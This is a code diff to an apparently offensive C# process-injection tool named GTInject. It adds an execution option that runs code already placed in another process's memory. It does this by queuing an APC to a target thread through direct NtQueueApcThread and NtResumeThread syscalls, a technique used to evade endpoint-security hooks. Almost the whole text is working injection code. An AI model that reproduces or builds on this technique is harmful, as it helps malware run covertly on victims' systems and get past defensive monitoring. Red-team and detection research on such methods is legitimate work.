@@ -28,6 +28,8 @@ namespace GTInject.Injection
                     return execopt202(memaddr, pid, tid);
                 case 300:
                     return execopt300(memaddr, pid, tid);
+                case 301:
+                    return execopt301(memaddr, pid, tid);
                 default:
                     Console.WriteLine( "[-] Not a valid Thread Execution option integer");
                     return IntPtr.Zero;
@@ -188,6 +190,60 @@ namespace GTInject.Injection
             IntPtr hThread = IntPtr.Zero;
             var status = Syscalls.SysclNtCreateThreadEx(out hThread, WinNative.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
             Console.WriteLine("     Direct Syscall to CreateThread " + status);
+
+            if (status == WinNative.NTSTATUS.Success)
+            {
+                return memaddr;
+            }
+            else
+            {
+                return IntPtr.Zero;
+            }
+
+        }
+
+
+        private static IntPtr execopt301(IntPtr memaddr, Process ProcID, int ThreadID)
+        {
+            /////////////////////////////////////
+            // OPTION 301 == Direct Syscall - NtQueueApcThread, NtResumeThread
+            /////////////////////////////////////
+
+            var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
+
+            // set up the syscall for NtQueueApcThread
+            var hProcess = ProcID.Handle;
+            IntPtr hThread = IntPtr.Zero;
+            var status = Syscalls.SysclNtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
+            Console.WriteLine("     Direct Syscall to NtQueueApcThread " + status);
+
+            if (status != 0)
+            {
+                Console.WriteLine("     QAPCThread Direct Syscall was non-success");
+                return IntPtr.Zero;
+            }
+            else
+            {
+                var threadObjects = ProcID.Threads;
+                for (int i = 0; i < threadObjects.Count; i++)
+                {
+                    if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
+                    {
+                        Console.WriteLine("     thread is suspended, so calling Direct Syscall NtResumeThread on this");
+                        var ntResTResp = Syscalls.SysclNtResumeThread(targetThread, 0);
+                        if (ntResTResp != 0)
+                        {
+                            Console.WriteLine("     Direct Syscall NtResumeThread failed");
+                            return IntPtr.Zero;
+                        }
+                    }
+                }
+                Console.WriteLine("     Direct Syscall for NtQueueApcThread executed");
+                return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
+            }
+
+            // set up the syscall for NtQueueApcThread
+
 
             if (status == WinNative.NTSTATUS.Success)
             {
